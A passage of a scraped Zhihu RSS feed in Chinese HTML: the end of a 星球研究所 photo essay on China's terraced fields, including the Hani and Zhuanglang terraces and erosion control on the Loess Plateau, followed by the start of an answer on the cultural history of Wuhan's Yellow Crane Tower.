data-private-watermark-src=\"v2-16ab88b7e3c9a65a2e8c6b646f4b5412\"></p>\n<p>如多彩的画盘，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9f8fe2a158e48ce7dae0c92d2c9b88dc_720w.jpg?rss\" data-caption=\"云南红河哈尼梯田，摄影师@张殿文\" data-size=\"normal\" data-rawwidth=\"889\" data-rawheight=\"1333\" data-watermark=\"original\" data-original-src=\"v2-9f8fe2a158e48ce7dae0c92d2c9b88dc\" data-watermark-src=\"v2-dea7d7841b04b3b3dac1481635ddb7b8\" data-private-watermark-src=\"v2-a8595a8612b20005e699c5aad09cf5af\"></p>\n<p>如变幻的宝镜，</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-294c8434e35c1f65d652defc9b0638a9_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@嘉楠\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2318\" data-watermark=\"original\" data-original-src=\"v2-294c8434e35c1f65d652defc9b0638a9\" data-watermark-src=\"v2-d7339a0e2cabcbbe6809052d67769e61\" data-private-watermark-src=\"v2-b8aa118848d01295b176371399ff83c6\"></p>\n<p>令你不得不感叹，这是何等的雄伟秀丽。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c81f0512d2ff2340885e6d010d9e3b9_720w.webp?rss\" data-caption=\"沉浸在朝阳之中的云南红河哈尼梯田，摄影师@陈小羊\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2909\" data-watermark=\"original\" data-original-src=\"v2-1c81f0512d2ff2340885e6d010d9e3b9\" data-watermark-src=\"v2-2b47a2cc7f70d2c0e5efabd01ebd7c1f\" data-private-watermark-src=\"v2-98e788db362f692f65357a9c895d95b9\"></p>\n<p>而梯田中的稻谷除了食用外，稻谷的秸秆还会被用来搭建独具特色的<b>「蘑菇房」</b>，因状如蘑菇而得名。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c2af9dd5ed2a9c9a851e1045939d7353_720w.webp?rss\" data-caption=\"云南哈尼族民居，其房顶依旧沿用传统的蘑菇房样式，摄影师@熊可\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-c2af9dd5ed2a9c9a851e1045939d7353\" data-watermark-src=\"v2-192c7ec7cfecbcfb2e79ac0d3c5da5f0\" data-private-watermark-src=\"v2-ec103e1b66ea07bfd0c87f50bc75edef\"></p>\n<p>就这样，古人在西南山地创造了梯田奇迹。</p>\n<p>而在新的时期，梯田将不止于是山地族群的生存寄托，更成为了改善生态环境的力量。</p>\n<hr>\n<h2><b>03 新的使命</b></h2>\n<p>在新中国成立之后，如何治理<b>黄土高原水土流失</b>成为一项亟待解决的任务。</p>\n<p>梯田，这一起源于北方，壮大于南方的耕地形式，开始重新在北方大规模扩展开来。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7b9039380f632395249134b49ca4fd15_720w.webp?rss\" data-caption=\"黄土高原上的梯田，摄影师@任世明\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-7b9039380f632395249134b49ca4fd15\" data-watermark-src=\"v2-cc77ba285604dd6cef45220242a05737\" data-private-watermark-src=\"v2-ab6236513865f8df41e549d853d4ceb6\"></p>\n<p>自20世纪60年代开始，我国开始在黄土高原大量修建梯田，<b>甘肃庄浪梯田</b>便是新一代梯田的典范。</p>\n<p>庄浪县位于甘肃东部，全县90%以上的土地都为沟壑纵横的黄土山地，水土流失严重，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-74f67611eba189d02fe76c35a4a5b6b0_720w.png?rss\" data-caption=\"庄浪地形示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-74f67611eba189d02fe76c35a4a5b6b0\" data-watermark-src=\"v2-02cdf20104d609642a71f6b097a7a5cf\" data-private-watermark-src=\"v2-1e722657c3c696b7a61a4ddf98164ef3\"></p>\n<p>而面对降雨，<b>梯田</b>比<b>坡地</b>可以有效减少水土流失，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2843eeccccb9cbd81015c39de58c66be_720w.gif?rss\" data-caption=\"坡地和台地降水对比，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"630\" data-rawheight=\"902\" data-watermark=\"original\" data-original-src=\"v2-2843eeccccb9cbd81015c39de58c66be\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>并增加有效光照面积，更加适宜作物的生长。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a0a7e4408c7b69a2ab032e3b1c4b2777_720w.webp?rss\" data-caption=\"台地与坡地种植区光照面积对比，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1546\" data-watermark=\"original\" data-original-src=\"v2-a0a7e4408c7b69a2ab032e3b1c4b2777\" data-watermark-src=\"v2-9dab24dc568d868002691a82a0d8c125\" data-private-watermark-src=\"v2-470ce946ba9522d69cb40335f10d1ba0\"></p>\n<p>于是，经过将近60年的努力，庄浪县94.5万亩坡地修成了平展的梯田，占全县山地面积的91.74%。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-190fac717684d8d856fbb0eb66974932_720w.webp?rss\" data-caption=\"甘肃平凉庄浪梯田，摄影师@王璐\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-190fac717684d8d856fbb0eb66974932\" data-watermark-src=\"v2-c56d62210d660c74d2ba5c048acadb36\" data-private-watermark-src=\"v2-c4ff130f021bef2165a2fe21c5b06710\"></p>\n<p>再加上配套修建水库、水窖、淤地坝等水利设施，以及覆盖地膜、修建日光温室、配套养猪场等方式，庄浪从一片贫瘠的土地蜕变成蔬菜和肉产品的供应基地，并成为第一个<b>「中国梯田化模范县」。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1932743ae81b778139e40a4d0d0934de_720w.webp?rss\" data-caption=\"正在进行铺膜作业的农民，合理使用地膜，具有保温和减少水分挥发等作用，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-1932743ae81b778139e40a4d0d0934de\" data-watermark-src=\"v2-7fc66671db6895c59b4c7040b54d852f\" data-private-watermark-src=\"v2-99d3e3f646a010f6da24bdee4a52e895\"></p>\n<p>除了庄浪，在黄河流域的很多地方，梯田都被用于水土流失的治理。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-afab6660aca15d05f449fb8020917efd_720w.png?rss\" data-caption=\"黄河中上游梯田分布示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-afab6660aca15d05f449fb8020917efd\" data-watermark-src=\"v2-e11f0c6dacc154821049d1a299f46fbc\" data-private-watermark-src=\"v2-3171650319e522067a5949b65bca8191\"></p>\n<p>在陕西铜川，当地人修建了<b>宜君梯田，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-533d48dbd7014e73bd9c687b1943f5d7_720w.webp?rss\" data-caption=\"陕西铜川宜君梯田，摄影师@王佳\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1511\" data-watermark=\"original\" data-original-src=\"v2-533d48dbd7014e73bd9c687b1943f5d7\" data-watermark-src=\"v2-2258862cd210577bed68943bba29e79d\" data-private-watermark-src=\"v2-d8325541e56ecdbd56001bb786717c07\"></p>\n<p>在渭南的黄土高原上，当地人修建了<b>蒲城梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-98d8b75193d3ad65a041d00060b5971f_720w.webp?rss\" data-caption=\"陕西渭南蒲城县的梯田，摄影师@射虎\" data-size=\"normal\" data-rawwidth=\"1074\" data-rawheight=\"3000\" data-watermark=\"original\" data-original-src=\"v2-98d8b75193d3ad65a041d00060b5971f\" data-watermark-src=\"v2-4b747df0407fad610772772ec7e25a25\" data-private-watermark-src=\"v2-3cf3e173e0c13dd769762c12e2ae4f52\"></p>\n<p>经过几十年的努力，再加上其他配套措施，黄土高原流域减少了约5万亿吨的泥沙流失。如果将这些泥沙堆成高1米、宽1米的沙堤，可绕地球赤道8圈。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-72d1e488bf1e34e8dff51d8aa3e5c28e_720w.webp?rss\" data-caption=\"近60年来黄土高原水平梯田面积与输沙量变化，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1906\" data-watermark=\"original\" data-original-src=\"v2-72d1e488bf1e34e8dff51d8aa3e5c28e\" data-watermark-src=\"v2-2d56884d3053a1edeeb1c8f8b00e5a31\" data-private-watermark-src=\"v2-7aa569232f8d1b1da5623dee36956b52\"></p>\n<p>此外，在河南林州，人们随山就势开垦出<b>石板岩大垴（nǎo）梯田、西井山梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9433c3e95fc8f15ada3636c900112fa5_720w.webp?rss\" data-caption=\"雪后的河南林州西井山梯田，摄影师@刘辰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-9433c3e95fc8f15ada3636c900112fa5\" data-watermark-src=\"v2-3a27b5bf48303ad4cfb66dd1c162f28b\" data-private-watermark-src=\"v2-ba6f71bd6097f62616e5ccfd71046b95\"></p>\n<p>在河北<b>阳原县，</b>人们在山坡上开垦出<b>旱作梯田，</b>种植着当地特色作物。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-be2dcca75ff31b150889500854ed1496_720w.webp?rss\" data-caption=\"河北张家口阳原旱作梯田，摄影师@陈剑峰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-be2dcca75ff31b150889500854ed1496\" data-watermark-src=\"v2-8e99a7225420682786e7186d2c4dc7dc\" data-private-watermark-src=\"v2-945de8f7e083aa47540114a7a816182c\"></p>\n<p>而伴随着时代发展，一些梯田也开始逐渐结束了历史使命。</p>\n<p>梯田作为人类向大山索取的土地，适度的开发有利于人类的发展，过度的开发则会破坏环境。</p>\n<p>为保护生态，按照2016年颁布的《“十三五”生态环境保护规划》，<i><b>「在具备条件的25度以上坡耕地</b></i></p>\n<p><i><b>实施退耕还林还草」，</b></i>许多梯田开始由耕地还原为草地与林地。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2fbbae819adbe1579153a388c85517d2_720w.webp?rss\" data-caption=\"几十年坚持飞播造林后郁郁葱葱的林州太行山，摄影师@李建斌\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-2fbbae819adbe1579153a388c85517d2\" data-watermark-src=\"v2-853541b216a8e200a79bfecae09f4801\" data-private-watermark-src=\"v2-455509c53e22b51508ea5a96b1ab4d63\"></p>\n<p>但梯田并不会完全退出历史的舞台，它依旧遍布中华大地。</p>\n<p>上饶灵山梯田、建德胥岭梯田、云和梅源梯田、永嘉茗岙梯田、筠连高坎梯田、肇兴堂安梯田、甘洛普昌梯田、酉阳花田梯田、昔阳大寨梯田、崇礼塞北梯田、涉县旱作梯田、吕梁柳林梯田、临海黄坦梯田、仙居公盂梯田、旌德兴隆梯田、固始锁口梯田、十八盘登山梯田、朝阳八盘沟梯田、遂昌南尖岩梯田、上虞覆卮山梯田......每一处梯田都是历史的见证，是绝佳的风景。</p>\n<p>它是<b>「开荒南野际，守拙归园田」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-71e7a940f590cc9d4c10a446c687e31e_720w.webp?rss\" data-caption=\"诗句出自陶渊明《归园田居·其一》，图为贵州丹寨梯田，摄影师@姚朝辉\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1845\" data-watermark=\"original\" data-original-src=\"v2-71e7a940f590cc9d4c10a446c687e31e\" data-watermark-src=\"v2-fa0cc921f0d8437eda81315afad6bf0b\" data-private-watermark-src=\"v2-3f5e9c575a77606b2c65ee0eaf468ec0\"></p>\n<p>它是<b>「招邀过邻里，款曲话桑麻」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5d4b93d2d3cf4c611aff0b7de782eb42_720w.webp?rss\" data-caption=\"诗句出自陈必复《村家》，图为云南元阳梯田，摄影师@崔永江\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-5d4b93d2d3cf4c611aff0b7de782eb42\" data-watermark-src=\"v2-fafe18bc34b4ebb8bce25900bdc4d74c\" data-private-watermark-src=\"v2-dd0b6781c3f19d73126b0a849328098a\"></p>\n<p>它是<b>「白水明田外，碧峰出山后」，</b></p>\n<p>（诗句出自王维《新晴野望》，下图为浙江台州仙居公盂梯田，摄影师@陈世丰）</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-89fc95d1e87698ebaff4f6a68c3ca07a_720w.webp?rss\" data-caption=\"诗句出自王维《新晴野望》，图为浙江台州仙居公盂梯田，摄影师@陈世丰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-89fc95d1e87698ebaff4f6a68c3ca07a\" data-watermark-src=\"v2-eb561354e8b79e5135d4bc78dbc224c3\" data-private-watermark-src=\"v2-39aff266c460f7aa52eab10792873914\"></p>\n<p>它是<b>「晨兴理荒秽，带月荷锄归」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-37f8fb36eb7791268e5153427a4bd1d0_720w.webp?rss\" data-caption=\"诗句出自陶渊明《归园田居·其三》，图为广西龙胜龙脊梯田，摄影师@邱新生\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-37f8fb36eb7791268e5153427a4bd1d0\" data-watermark-src=\"v2-5394ea75a4577563b88013be52540eac\" data-private-watermark-src=\"v2-76c1737cdf15da0a784e94cdc942200a\"></p>\n<p>它是<b>「几处闲田，隔水动春锄」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5075316ac6c8b395496920ad70caefe8_720w.webp?rss\" data-caption=\"诗句出自张炎《渡江云·山阴久客一再逢春回忆西杭渺然愁思》，图为云南红河哈尼梯田，摄影师@廖志远\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-5075316ac6c8b395496920ad70caefe8\" data-watermark-src=\"v2-3854fb8c1d855ccf332baae69d145b50\" data-private-watermark-src=\"v2-2d3d125f46c44d85a18c2828287dd23b\"></p>\n<p>它是<b>「一水护田将绿绕，两山排闼送青来」，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d2665cb931bba917b73db5d067045fbe_720w.webp?rss\" data-caption=\"诗句出自王安石《书湖阴先生壁二首》，图为浙江遂昌湖山梯田，摄影师@舒同才\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1724\" data-watermark=\"original\" data-original-src=\"v2-d2665cb931bba917b73db5d067045fbe\" data-watermark-src=\"v2-662cb30d2508d684b15e70c1b4edcaf3\" data-private-watermark-src=\"v2-a1d1d897d7758f53044e48e12638e29d\"></p>\n<p>它是<b>「田家几日闲，耕种从此起」。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f04b8912f260a49580e87d683908e0a_720w.webp?rss\" data-caption=\"诗句出自韦应物《观田家》，图为湖北宣恩木笼古村寨之中的梯田，摄影师@文林\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-6f04b8912f260a49580e87d683908e0a\" data-watermark-src=\"v2-220f0181d2c83659cc44186d067f33ab\" data-private-watermark-src=\"v2-04cdcae434182aa06f6d9fb82cf71edf\"></p>\n<p>梯田，于无声处改变着中国。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4e01a71076e264982aedfe9f91ece308_720w.webp?rss\" data-caption=\"贵州黔南平塘的梯田，摄影师@酷鸟魏建\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-4e01a71076e264982aedfe9f91ece308\" data-watermark-src=\"v2-bce42bb601f689c179d53ff1ab3c79fb\" data-private-watermark-src=\"v2-ed8b3b31600abad43fd2aedcdeb0e650\"></p>\n<p>作为<b>立体绿化</b>的一部分，它让绿色驻留，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2b3843511208921c53afb26f1bcdf6b6_720w.webp?rss\" data-caption=\"贵州毕节大方奢香古镇中的城中花海梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-2b3843511208921c53afb26f1bcdf6b6\" data-watermark-src=\"v2-c5785cace00a2b9aa83a3a23a85179d9\" data-private-watermark-src=\"v2-0394fd540fd0d6d4d917a5181225e4ba\"></p>\n<p>它让大地多彩，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-60a05f0ada25012aa5605093bd6a00df_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@卢文\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1703\" data-watermark=\"original\" data-original-src=\"v2-60a05f0ada25012aa5605093bd6a00df\" data-watermark-src=\"v2-fa73f3b44dfabc1bb51ac988dbbe0b06\" data-private-watermark-src=\"v2-e7c8e09d0103c8083d80914deca40c58\"></p>\n<p>它让故乡如诗，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c818402877954c673795653304e2b0f_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@何俊云\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-3c818402877954c673795653304e2b0f\" data-watermark-src=\"v2-26117f92517d8b1c525f11fa1114c139\" data-private-watermark-src=\"v2-b66581b2ec61df9d737b445c4db838cd\"></p>\n<p>它让丰收连年，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-70d798e26e72c0e34121c0fef9812024_720w.webp?rss\" data-caption=\"安徽黄山呈坎灵山梯田，摄影师@堂少\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-70d798e26e72c0e34121c0fef9812024\" data-watermark-src=\"v2-5df76aa30312a933be980a37af1c78db\" data-private-watermark-src=\"v2-8808b628bb8bf27c4066f9fe71ee0ef2\"></p>\n<p>梯田里不仅有千百年来中国人的汗水，还有着人与大山之间的默契。</p>\n<p>通过梯田，我们能读懂古人生存的往昔，也能看到今人改变的未来。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-06f6aabc205dd021b7f3291fdb7aa19b_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@卢文\" data-size=\"normal\" data-rawwidth=\"902\" data-rawheight=\"3033\" data-watermark=\"original\" data-original-src=\"v2-06f6aabc205dd021b7f3291fdb7aa19b\" data-watermark-src=\"v2-c3303dcfeec6bd0f38c2b789a77210f3\" data-private-watermark-src=\"v2-b5c999c650ec4b7bb72e5229e1835ca3\"></p>\n<p>全文完，感谢阅读。</p>\n<hr>\n<p><b>本文创作团队</b></p>\n<ul>\n<li>\n<b>撰文：</b> 河边的卡西莫多 </li>\n<li>\n<b>编辑：</b>所长</li>\n<li>\n<b>图片：</b> 潘晨霞 </li>\n<li>\n<b>地图：</b>郑艺</li>\n<li>\n<b>设计：</b>王申雯 </li>\n<li>\n<b>审校：</b>张照 丁佳昕 陈志浩</li>\n</ul>\n<p><br></p>\n<p><b>头图摄影师：</b>傅鼎</p>\n<p><b>封面摄影师：</b>韦革宁 万贲</p>\n<p><br></p>\n<p><b>专家审核</b></p>\n<ul><li>清华大学地球系统科学系 俞乐研究员</li></ul>\n<p><br></p>\n<p><b>本文主要参考文献</b></p>\n<ul>\n<li>[1]李根蟠著. 中国古代农业[M]. 北京：商务印书馆, 1998.</li>\n<li>[2]刘兴林著. 先秦两汉农业与乡村聚落的考古学研究[M]. 北京：文物出版社, 2017.</li>\n<li>[3]梁家勉著；倪根金主编. 梁家勉农史文集[M]. 北京：中国农业出版社, 2002.</li>\n<li>[4]红河哈尼族彝族自治州旅游发展委员会编. 千年哈尼梯田[M]. 云南出版集团；云南人民出版社, 2015.</li>\n<li>[5]闵庆文，田密主编；张红榛，角媛梅，刘珊副主编. 云南红河哈尼稻作梯田系统[M]. 北京：中国农业出版社, 2015.</li>\n<li>[6]史军超，白海思主编. 首届哈尼梯田大会（中国·红河）论文集[M]. 昆明：云南人民出版社, 2012.</li>\n<li>[7]（美）马立博著；关永强，高丽洁译. 海外中国研究文库 中国环境史 从史前到现代[M]. 北京：中国人民大学出版社, 2015.</li>\n<li>[8]曹博文,俞乐，Victoria Naipal, Philippe Ciais,李伟，赵圆圆，卫伟，陈蝶，刘壮，宫鹏. A 30 m terrace mapping in China using Landsat 8 imagery and digital elevation model based on the Google Earth Engine[J]. Earth System Science Data, 2021.</li>\n<li>[9]李含琳.我国山地农村实施梯田改造升级工程的可行性分析——以甘肃省的情况分析为基础[J].天水行政学院学报,2016.</li>\n<li>[10]姚云峰,王礼先. 我国梯田的形成与发展[J]. 中国水土保持,1991.</li>\n<li>[11]陈桃金,刘维,赖格英,赖怡恬,吴青,李世伟.江西崇义客家梯田的起源与演变研究[J].江西科学,2017.</li>\n<li>[12]曾雄生.唐宋时期的畬田与畬田民族的历史走向[J].古今农业,2005.</li>\n<li>[13]刘伟,康健.近七十年来明清棚民研究的回顾与反思[J].农业考古,2018.</li>\n<li>[14]马岑晔.哈尼族梯田灌溉管理系统探析[J].红河学院学报,2009.</li>\n<li>[15]角媛梅,杨有洁,胡文英,速少华.哈尼梯田景观空间格局与美学特征分析[J].地理研究,2006.</li>\n<li>[16]焦雯珺,闵庆文.紫鹊界梯田:山地自流灌溉系统的典型代表[J].中国投资,2018.</li>\n<li>[17]韦妮妮.景观型农业文化遗产保护性旅游开发探究——以广西龙胜龙脊梯田为例[J].农业农村部管理干部学院学报,2019.</li>\n<li>[18]梁淑巧.艰苦奋战三十年 庄浪坡地变梯田[J].中国水土保持,1997.</li>\n<li>[19]王志刚,何煜,王红.庄浪县梯田深层次开发的思考[J].中国水土保持,2009.</li>\n<li>[20]贾志宏,袁莉.庄浪梯田产业道路建设发展综述[J].中国农业信息,2012.</li>\n<li>[21]程志立.庄浪梯田化建设与黄土丘陵地区生态建设的启示[J].农业与技术,2014.</li>\n</ul>\n<p><br></p>\n<p><b>星球研究所，一群国家地理控，专注于探索极致世界</b></p>\n<p><b>···THE END···</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xing-qiu-yan-jiu-suo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">星球研究所</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/48230461/answer/2068476529?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">19 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/25516962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">中国最美的秋天在哪里？</a><br><a href=\"http://www.zhihu.com/question/264237471?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">假如撒哈拉沙漠往后每年的降雨量和广东相当，在无人为因素的条件下，会不会成为一片沃土？</a><br>\n","link":"http://www.zhihu.com/question/48230461/answer/2068476529?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉黄鹤楼既然是新建的，游览价值是什么？","date":"2021-08-26 03:55:55","description":"\n<p>文章发上知乎以来，为了对网友负责和对自己负责，最近几天先后修订十几遍，订正错别字外还添加多段必须添加的文字，为了说清楚文章想说的话。</p>\n<p>疫情前，《中国国家地理》期刊约稿，专写武汉黄鹤楼历史源脉和文化价值，即《武汉黄鹤楼》（刊发时题目有修改），文章已经正式刊发，谢谢！</p>\n<p>算不上黄鹤楼文史研究专业学者，这里仅就自己在写作中涉及到的一星半点相关知识，谈谈我对黄鹤楼文化价值的了解和理解。</p>\n<p>为了节省时间和精力，就不再另起炉灶布局谋篇一个新文了，蛮累的。有现成的文稿数篇，放电脑也是放着，找出来一边合成一边反复修改成下面的文字。黄鹤楼景区的图片，前前后后八九年间拍摄数次，有一些图片不知道存在哪里去了（家里五个电脑两个移动硬盘）？不过不要紧，以后有机会进黄鹤楼景区拍高清图片，以后的事了。</p>\n<p>谢谢赠给我历史资料图片的武汉文史圈专家学者老师！谢谢转发我文章的朋友老师！你们的支持和爱，是我人生坚强的动力！</p>\n<p>下面文章如果有补充文字，就放图片注释，大家阅读时请留意。</p>\n<p>先上图：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fb90c0ebf02477e2ab5db70132f06d7e_720w.jpg?rss\" data-rawwidth=\"2736\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"黄鹤楼面对东方匾额上的大字“楚天极目”；面对南方：“南维高拱”；面对北方：“北斗平临“……此图黄鹤楼面对东方，面对江东（长江东岸）大片陆地，武昌过去直达湖南，古代楚国山河尽收眼底——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fb90c0ebf02477e2ab5db70132f06d7e\" data-watermark-src=\"v2-c64c4ebb0dbb2c72f88e5ada2520f203\" data-private-watermark-src=\"v2-bb7318672132e1fb4601aa80047737fa\"></p>\n<p>下面我的文章全文——和投稿《中国国家地理》那一篇相似又不同。这篇文章的写作，完全达到了我想要的“效果”——把我多年来《黄鹤楼》写作研究中领悟到一些东西（文化知识、人生哲理等）委婉直白（两个词不矛盾）地表达出来了。当然，还得网友（读友）喜欢。</p>\n<h2>胡榴明：天地之间黄鹤楼</h2>\n<h3>黄鹄矶</h3>\n<p>武昌黄鹤楼，所以称为“天下绝景”，因为地理位置“绝无仅有”——“江南三大名楼”另外两座，江西滕王阁、湖南岳阳楼莫不如此。</p>\n<p>位于蛇山头，临于大江畔，黄鹤楼的存在，以及它存在的意义，从古至今，无可比拟。</p>\n<p>当年，江汉之交（古称长江和汉江交汇之地）江、河、湖，纵横恣肆，陆地稀缺，建城不容易。</p>\n<p>长江西来，江流千里，空中看蜿蜒曲折，地面看气势磅礴，进入武汉城市区，从西南向东北绕了一个半圈，分开龟蛇二山，与汉江汇合东去。</p>\n<p>江东蛇山，山形狭长，蛇形游走，匍匐横贯武昌城（古称夏口、江夏、鄂州、武昌），山脉顶端紧抵长江，山与江垂直，如英文字母“T”,横竖相接处，蛇山截止，千尺危崖临江兀立，山形随水势生威，登高如飞鸟临虚，古人取名黄鹄矶，也称黄鹤矶或黄鹊矶。</p>\n<p>黄鹤楼建在黄鹄矶上。</p>\n<p>危崖上建楼阁，楼阁上看风景， 看江看城，看天看地，高天大地、四野八荒，古今联想，时空悠游。</p>\n<p>当年的武昌老城，大道开阔，小巷幽深，一律青石板铺地，每数十步掘一口井，井口很小，圆圆一圈石头井栏，小木桶系一根绳子坠下去，拉上来半木桶清冷的甜水……（作者注：这一段文字描写是我小时候亲身经历，说明武昌老城痕迹一直保留到1980年前）</p>\n<p>蛇山山脊朝下望，里巷坊间屋舍儼然，气象森严的府衙，门陈罗琦的商埠，静守庭院的民居，笙箫弦管的歌坊酒肆……山北沙湖，山南南湖，湖心荷花，湖岸杨柳和芦苇……</p>\n<p>武昌长街（今解放路），顺长江流向延伸，西向横街通江边码头，东向横街通商贸集市，蛇山观风景，南湖逛夜市，阅马场演兵，城墙根下汉阳门外茶馆里喝茶戏园子里听戏，黄鹤楼下武昌城墙外长江边长长一条临江道，店铺一间挨一间，一隔隔门扇朝着江面大敞开，白天江上行舟千帆过往，夜里江畔泊船万灯明灭……</p>\n<p>临江道边有石阶，仰头山石嶙峋林木参差，古画中有烟云缭绕，现实中还不至于，山不在高……拾级而上黄鹄矶，很方便地来黄鹤楼登黄鹤楼（古代黄鹤楼不算高，主要是天造地设位置好）——离通衢大道不远，离人间烟火很近。</p>\n<p>历史上的黄鹤楼，从来都是屡毁屡建，仅明清两代就被毁7次、重建和维修10次……被毁原因很多，天灾和人祸，其实很多天灾也是人祸（木构架建筑的弱点）……赤焰黑烟散去，一方焦土一堆枯木，雕梁画栋，朱翠金碧，昨天成追忆，一场大梦惊醒——愈美丽，愈凄凉……</p>\n<p>1957年，武汉长江大桥建成，从汉阳龟山跨越大江落到武昌蛇山，黄鹄矶承托武